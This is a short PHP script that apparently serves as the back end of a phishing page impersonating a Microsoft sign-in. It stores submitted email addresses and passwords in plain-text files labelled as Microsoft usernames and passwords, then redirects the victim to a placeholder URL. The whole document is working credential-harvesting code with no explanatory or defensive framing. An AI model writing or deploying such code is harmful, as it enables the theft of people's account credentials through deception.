<?php

file_put_contents("usernames.txt", "Microsoft Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Microsoft Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://redirecturl');
?>
